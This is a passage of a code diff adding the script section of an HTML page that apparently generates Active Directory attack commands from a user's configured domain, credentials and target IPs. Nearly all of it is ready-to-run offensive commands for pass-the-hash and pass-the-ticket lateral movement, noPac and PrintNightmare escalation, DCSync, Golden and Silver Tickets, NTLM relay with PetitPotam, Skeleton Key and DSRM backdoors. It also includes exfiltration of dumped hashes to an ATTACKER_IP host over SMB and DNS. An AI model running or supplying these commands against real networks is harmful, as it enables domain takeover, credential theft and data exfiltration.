+  renderLM(sub);
+}
+
+function renderLM(sub) {
+  const c = document.getElementById('lm-content');
+  const d = config.domain, p = pivot, creds = config.creds;
+  const user = creds ? creds.split(':')[0] : 'USER';
+  const pass = creds ? creds.split(':')[1] : 'PASS';
+
+  let html = '';
+  if (sub === 'psexec') {
+    html = `
+      ${cmdBlock('psexec.py (semi-interactive shell)', `psexec.py ${d}/${user}:${pass}@${p.intIP || 'TARGET_IP'}`)}
+      ${cmdBlock('psexec.py (with hashes)', `psexec.py ${user}@${p.intIP || 'TARGET_IP'} -hashes :${'NTHASH'}`)}
+      ${cmdBlock('CrackMapExec (exec via SMB)', `crackmapexec smb ${p.intIP || 'TARGET_IP'} -u '${user}' -p '${pass}' -x 'whoami'`)}
+    `;
+  } else if (sub === 'wmi') {
+    html = `
+      ${cmdBlock('wmiexec.py', `wmiexec.py ${d}/${user}:${pass}@${p.intIP || 'TARGET_IP'}`)}
+      ${cmdBlock('wmiexec.py (with hashes)', `wmiexec.py ${user}@${p.intIP || 'TARGET_IP'} -hashes :${'NTHASH'}`)}
+      ${cmdBlock('CrackMapExec (exec via WMI)', `crackmapexec wmi ${p.intIP || 'TARGET_IP'} -u '${user}' -p '${pass}' -x 'whoami /priv'`)}
+    `;
+  } else if (sub === 'winrm') {
+    html = `
+      ${cmdBlock('evil-winrm', `evil-winrm -i ${p.intIP || 'TARGET_IP'} -u '${user}' -p '${pass}'`)}
+      ${cmdBlock('evil-winrm (with hash)', `evil-winrm -i ${p.intIP || 'TARGET_IP'} -u '${user}' -H ${'NTHASH'}`)}
+      ${cmdBlock('CrackMapExec (exec via WinRM)', `crackmapexec winrm ${p.intIP || 'TARGET_IP'} -u '${user}' -p '${pass}' -x 'whoami'`)}
+    `;
+  } else if (sub === 'pth') {
+    html = `
+      ${cmdBlock('psexec.py (pass-the-hash)', `psexec.py ${user}@${p.intIP || 'TARGET_IP'} -hashes :${'NTHASH'}`)}
+      ${cmdBlock('wmiexec.py (pass-the-hash)', `wmiexec.py ${user}@${p.intIP || 'TARGET_IP'} -hashes :${'NTHASH'}`)}
+      ${cmdBlock('evil-winrm (pass-the-hash)', `evil-winrm -i ${p.intIP || 'TARGET_IP'} -u '${user}' -H ${'NTHASH'}`)}
+      ${cmdBlock('CrackMapExec (pass-the-hash)', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -H ${'NTHASH'} --shares --sessions --loggedon-users`)}
+      ${cmdBlock('secretsdump.py (dump from hash)', `secretsdump.py ${user}@${p.intIP || 'TARGET_IP'} -hashes :${'NTHASH'}`)}
+    `;
+  } else if (sub === 'ptt') {
+    html = `
+      ${cmdBlock('Get TGT first', `getTGT.py ${d}/${user}:${pass} -dc-ip ${p.intIP || 'DC_IP'}\nexport KRB5CCNAME=${user}.ccache`)}
+      ${cmdBlock('psexec with ticket (PTT)', `KRB5CCNAME=${user}.ccache psexec.py ${d}/${user}@${p.intIP || 'TARGET_IP'} -k -no-pass`)}
+      ${cmdBlock('wmiexec with ticket (PTT)', `KRB5CCNAME=${user}.ccache wmiexec.py ${d}/${user}@${p.intIP || 'TARGET_IP'} -k -no-pass`)}
+      ${cmdBlock('secretsdump with ticket (DCSync prep)', `KRB5CCNAME=${user}.ccache secretsdump.py ${d}/${user}@${p.intIP || 'DC_IP'} -k -no-pass`)}
+    `;
+  } else if (sub === 'snaffler') {
+    html = `
+      ${cmdBlock('Snaffler (find creds in shares)', `.\\Snaffler.exe -s -o snaffler.log -v data`, 'Run on Windows pivot host — scans accessible file shares for creds')}
+      ${cmdBlock('Manual share hunting', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -p '${pass}' --shares\n# Then:\nsmbclient //${p.intIP || 'TARGET_IP'}/ShareName -U '${user}%${pass}' -c 'recurse;ls'`)}
+    `;
+  }
+  c.innerHTML = html;
+}
+
+function showPE(sub, el) {
+  document.querySelectorAll('#body-privesc .phase-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderPE(sub);
+}
+
+function renderPE(sub) {
+  const c = document.getElementById('pe-content');
+  const d = config.domain, p = pivot, creds = config.creds;
+  const user = creds ? creds.split(':')[0] : 'USER';
+  const pass = creds ? creds.split(':')[1] : 'PASS';
+
+  let html = '';
+  if (sub === 'nopac') {
+    html = `
+      ${cmdBlock('noPac.py (scan for vulnerability)', `noPac.py ${d}/${user}:${pass} -dc-ip ${p.intIP || 'DC_IP'} --impersonate administrator -scan`)}
+      ${cmdBlock('noPac.py (exploit — get DA)', `noPac.py ${d}/${user}:${pass} -dc-ip ${p.intIP || 'DC_IP'} --impersonate administrator`)}
+      ${cmdBlock('secretsdump after noPac', `secretsdump.py ${d}/administrator@${p.intIP || 'DC_IP'} -hashes :${'NTHASH'}`)}
+    `;
+  } else if (sub === 'printnightmare') {
+    html = `
+      ${cmdBlock('CVE-2021-1675.py (scan)', `CVE-2021-1675.py ${d}/${user}:${pass}@${p.intIP || 'TARGET_IP'} \\\\${a || 'ATTACKER_IP'}\\share\\malicious.dll`)}
+      ${cmdBlock('Check if vulnerable (Impacket)', `rpcdump.py ${p.intIP || 'TARGET_IP'} | grep -i MS-RPRN`, 'If PrintSystemAsync exists, likely vulnerable')}
+    `;
+  } else if (sub === 'laps') {
+    html = `
+      ${cmdBlock('LAPSToolkit — find LAPS computers', `Import-Module .\\LAPSToolkit.ps1\nFind-LAPSDelegatedGroups`)}
+      ${cmdBlock('LAPSToolkit — get LAPS passwords', `Get-LAPSComputers`, 'Requires rights to read ms-Mcs-AdmPwd attribute')}
+      ${cmdBlock('ldapsearch for LAPS', `ldapsearch -x -H ldap://${p.intIP || 'DC_IP'} -D '${user}' -w '${pass}' -b "DC=${d?d.replace(/\./g,',DC='):''}" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd`)}
+    `;
+  } else if (sub === 'gpp') {
+    html = `
+      ${cmdBlock('Find GPP files in SYSVOL', `smbclient //${p.intIP || 'DC_IP'}/SYSVOL -U '${user}%${pass}' -c 'recurse;ls' | grep -i groups`)}
+      ${cmdBlock('gpp-decrypt', `gpp-decrypt 'encrypted_password_here'`, 'Decrypts passwords from Groups.xml, ScheduledTasks.xml, etc.')}
+      ${cmdBlock('CrackMapExec GPP hunt', `crackmapexec smb ${p.intIP || 'DC_IP'} -u '${user}' -p '${pass}' -M gpp_autologin\ncrackmapexec smb ${p.intIP || 'DC_IP'} -u '${user}' -p '${pass}' -M gpp_password`)}
+    `;
+  } else if (sub === 'uac') {
+    html = `
+      ${cmdBlock('Check whoami /priv', `whoami /priv`, 'Run on target — look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege')}
+      ${cmdBlock('PrintSpoofer (SeImpersonate)', `.\\PrintSpoofer.exe -i -c cmd`, 'Abuse SeImpersonatePrivilege for SYSTEM')}
+      ${cmdBlock('JuicyPotato / Potato family', `.\\JuicyPotato.exe -l 1337 -t * -p cmd.exe`, 'Abuse DCOM/SeImpersonate — older Windows')}
+      ${cmdBlock('RoguePotato (modern)', `sudo socat TCP-LISTEN:135,reuseaddr,fork TCP:${p.intIP || 'TARGET_IP'}:9999 &\nRoguePotato -r ${a || 'ATTACKER_IP'} -e cmd.exe -l 9999`)}
+    `;
+  } else if (sub === 'token') {
+    html = `
+      ${cmdBlock('Incognito (token impersonation)', `load incognito\nlist_tokens -u\nimpersonate_token "DOMAIN\\Administrator"`)}
+      ${cmdBlock('Rubeus (monitor for tickets)', `Rubeus.exe monitor /interval:5 /user:administrator`, 'Wait for a TGT from a privileged user')}
+    `;
+  }
+  c.innerHTML = html;
+}
+
+function showDD(sub, el) {
+  document.querySelectorAll('#body-dominance .phase-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderDD(sub);
+}
+
+function renderDD(sub) {
+  const c = document.getElementById('dd-content');
+  const d = config.domain, p = pivot, creds = config.creds;
+  const user = creds ? creds.split(':')[0] : 'USER';
+  const pass = creds ? creds.split(':')[1] : 'PASS';
+
+  let html = '';
+  if (sub === 'dcsync') {
+    html = `
+      ${cmdBlock('secretsdump.py (DCSync)', `secretsdump.py ${d}/${user}:${pass}@${p.intIP || 'DC_IP'} -just-dc-ntlm`)}
+      ${cmdBlock('secretsdump (full — all hashes + secrets)', `secretsdump.py ${d}/${user}:${pass}@${p.intIP || 'DC_IP'}`)}
+      ${cmdBlock('secretsdump (specific user)', `secretsdump.py ${d}/${user}:${pass}@${p.intIP || 'DC_IP'} -just-dc-ntlm -user administrator`)}
+      ${cmdBlock('Mimikatz DCSync (on Windows)', `lsadump::dcsync /domain:${d} /user:krbtgt`, 'Run on compromised DC or with DA creds')}
+    `;
+  } else if (sub === 'golden') {
+    html = `
+      ${cmdBlock('Get krbtgt hash first', `secretsdump.py ${d}/${user}:${pass}@${p.intIP || 'DC_IP'} -just-dc-ntlm -user krbtgt`)}
+      ${cmdBlock('ticketer.py (Golden Ticket)', `ticketer.py -nthash ${'KRBTGT_NTHASH'} -domain-sid ${'S-1-5-21-...'} -domain ${d} administrator`)}
+      ${cmdBlock('Rubeus Golden Ticket', `Rubeus.exe golden /krbtgt:${'KRBTGT_NTHASH'} /domain:${d} /sid:${'S-1-5-21-...'} /id:500 /ptt`)}
+      ${cmdBlock('Mimikatz Golden Ticket', `kerberos::golden /domain:${d} /sid:${'S-1-5-21-...'} /rc4:${'KRBTGT_NTHASH'} /id:500 /ptt`)}
+      ${cmdBlock('Verify Golden Ticket', `psexec.py ${d}/administrator@${p.intIP || 'DC_IP'} -k -no-pass`)}
+    `;
+  } else if (sub === 'silver') {
+    html = `
+      ${cmdBlock('Get target service hash', `secretsdump.py ${d}/${user}:${pass}@${p.intIP || 'TARGET_IP'} -just-dc-ntlm -user svc_target`)}
+      ${cmdBlock('ticketer.py (Silver Ticket for CIFS)', `ticketer.py -nthash ${'SERVICE_NTHASH'} -domain-sid ${'S-1-5-21-...'} -domain ${d} -spn cifs/${p.intIP || 'TARGET_IP'} administrator`)}
+      ${cmdBlock('Rubeus Silver Ticket', `Rubeus.exe silver /service:cifs/${p.intIP || 'TARGET_IP'} /rc4:${'SERVICE_NTHASH'} /sid:${'S-1-5-21-...'} /domain:${d} /ptt`)}
+    `;
+  } else if (sub === 'relay') {
+    html = `
+      ${cmdBlock('ntlmrelayx (relay to LDAP)', `ntlmrelayx.py -t ldap://${p.intIP || 'DC_IP'} --escalate-user ${user} -smb2support`)}
+      ${cmdBlock('ntlmrelayx (relay to SMB)', `ntlmrelayx.py -t smb://${p.intIP || 'TARGET_IP'} -smb2support -c 'whoami /priv'`)}
+      ${cmdBlock('ntlmrelayx (add computer account)', `ntlmrelayx.py -t ldap://${p.intIP || 'DC_IP'} --add-computer`, 'Creates a computer account for RBCD attacks')}
+    `;
+  } else if (sub === 'petit') {
+    html = `
+      ${cmdBlock('Start ntlmrelayx first', `ntlmrelayx.py -t ldap://${p.intIP || 'DC_IP'} --escalate-user ${user} -smb2support`)}
+      ${cmdBlock('Trigger PetitPotam', `PetitPotam.py ${a || 'ATTACKER_IP'} ${p.intIP || 'DC_IP'}`, 'Coerces DC to auth to attacker → relayed to LDAP → privesc')}
+      ${cmdBlock('Alternative coerce methods', `PetitPotam.py -u '${user}' -p '${pass}' -d ${d} ${a || 'ATTACKER_IP'} ${p.intIP || 'DC_IP'}`)}
+    `;
+  } else if (sub === 'adcs') {
+    html = `
+      ${cmdBlock('Certify (find vulnerable templates)', `.\\Certify.exe find /vulnerable`, 'Run on Windows pivot')}
+      ${cmdBlock('certipy (find + request)', `certipy find -u ${user}@${d} -p '${pass}' -dc-ip ${p.intIP || 'DC_IP'} -vulnerable -stdout`)}
+      ${cmdBlock('certipy (request cert for DA)', `certipy req -u ${user}@${d} -p '${pass}' -ca ${d}-CA -template VulnerableTemplate -target ${p.intIP || 'DC_IP'}`)}
+      ${cmdBlock('certipy (authenticate with cert)', `certipy auth -pfx administrator.pfx -dc-ip ${p.intIP || 'DC_IP'}`)}
+    `;
+  }
+  c.innerHTML = html;
+}
+
+function showPX(sub, el) {
+  document.querySelectorAll('#body-postex .phase-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderPX(sub);
+}
+
+function renderPX(sub) {
+  const c = document.getElementById('px-content');
+  const d = config.domain, p = pivot, creds = config.creds;
+  const user = creds ? creds.split(':')[0] : 'USER';
+  const pass = creds ? creds.split(':')[1] : 'PASS';
+
+  let html = '';
+  if (sub === 'bloodhound') {
+    html = `
+      ${cmdBlock('BloodHound.py (Linux collector)', `bloodhound-python -d ${d} -u '${user}' -p '${pass}' -ns ${p.intIP || 'DC_IP'} -c all`)}
+      ${cmdBlock('SharpHound (Windows collector)', `.\\SharpHound.exe -c All,GPOLocalGroup --encryptzip --nosavecache`, 'Run on pivot host, zip output, transfer to attack box')}
+      ${cmdBlock('Start BloodHound GUI', `sudo neo4j console &\nbloodhound`, 'Import the JSON/ZIP from SharpHound or bloodhound-python')}
+      ${cmdBlock('BloodHound — useful queries', `# Shortest path to DA\n# Find all Kerberoastable users\n# Find DCSync rights\n# Find computers with Unconstrained Delegation`, 'Use the built-in analysis queries in BloodHound GUI')}
+    `;
+  } else if (sub === 'secretsdump') {
+    html = `
+      ${cmdBlock('secretsdump (local — from SAM)', `secretsdump.py -sam sam.save -system system.save LOCAL`)}
+      ${cmdBlock('secretsdump (remote)', `secretsdump.py ${d}/${user}:${pass}@${p.intIP || 'TARGET_IP'}`)}
+      ${cmdBlock('secretsdump (with DC hash — DCSync)', `secretsdump.py ${d}/administrator@${p.intIP || 'DC_IP'} -hashes :${'NTHASH'}`)}
+    `;
+  } else if (sub === 'mimikatz') {
+    html = `
+      ${cmdBlock('Mimikatz — dump creds from memory', `privilege::debug\nlsadump::sam\nlsadump::secrets\nsekurlsa::logonpasswords`)}
+      ${cmdBlock('Mimikatz — DCSync', `lsadump::dcsync /domain:${d} /user:krbtgt`)}
+      ${cmdBlock('Mimikatz — PtH', `sekurlsa::pth /user:administrator /domain:${d} /ntlm:${'NTHASH'} /run:cmd.exe`)}
+      ${cmdBlock('Mimikatz — Golden Ticket', `kerberos::golden /domain:${d} /sid:${'S-1-5-21-...'} /rc4:${'KRBTGT_NTHASH'} /id:500 /ptt`)}
+      ${cmdBlock('Mimikatz — Pass-the-Ticket', `kerberos::ptt ticket.kirbi`)}
+    `;
+  } else if (sub === 'persistence') {
+    html = `
+      ${cmdBlock('Golden Ticket (persistence)', `ticketer.py -nthash ${'KRBTGT_NTHASH'} -domain-sid ${'S-1-5-21-...'} -domain ${d} administrator`, 'Valid for 10 years by default')}
+      ${cmdBlock('Skeleton Key (Mimikatz)', `misc::skeleton`, 'Password for any user becomes "mimikatz" while active')}
+      ${cmdBlock('DSRM password (backdoor)', `lsadump::setntlm /server:${p.intIP || 'DC_IP'} /user:Administrator /password:NewPass123!`, 'Log in with local admin creds on DC')}
+      ${cmdBlock('AdminSDHolder (persistence)', `# Add user to AdminSDHolder ACL\n# Wait 60 min or run SDProp\n# User gets DA-equivalent rights`, 'Abuse SDProp to maintain DA access')}
+    `;
+  } else if (sub === 'exfil') {
+    html = `
+      ${cmdBlock('smbserver.py (receive files)', `smbserver.py -smb2support -user user -pass pass share .`, 'Set up SMB server, then copy files from target')}
+      ${cmdBlock('Transfer from target (Windows)', `net use Z: \\\\${a || 'ATTACKER_IP'}\\share /user:user pass\ncopy C:\\temp\\hashes.txt Z:\\`)}
+      ${cmdBlock('Transfer from target (Linux)', `smbclient //${a || 'ATTACKER_IP'}/share -U 'user%pass' -c 'put /tmp/hashes.txt'`)}
+      ${cmdBlock('DNS exfil (slow but stealthy)', `for line in $(cat data.txt); do dig $line.${a || 'ATTACKER_IP'}; done`)}
+    `;
+  }
+  c.innerHTML = html;
+}
+
+// ── Init ──
+renderTargets();
+renderRecon('enum');
+renderIA('kerbrute');
+renderLM('psexec');
+renderPE('nopac');
+renderDD('dcsync');
+renderPX('bloodhound');
+</script>
+
+<div style="text-align:center;padding:10px 0 20px;color:var(--text2);font-size:11px;border-top:1px solid var(--border);margin-top:20px;">
+  Created by <a href="https://github.com/hackdhd" target="_blank" rel="noopener" style="color:var(--accent);text-decoration:none;">hAckDHD</a> — <a href="https://github.com/hackdhd" target="_blank" rel="noopener" style="color:var(--accent);text-decoration:none;">github.com/hackdhd</a>
+</div>
+
+</body>
+</html>
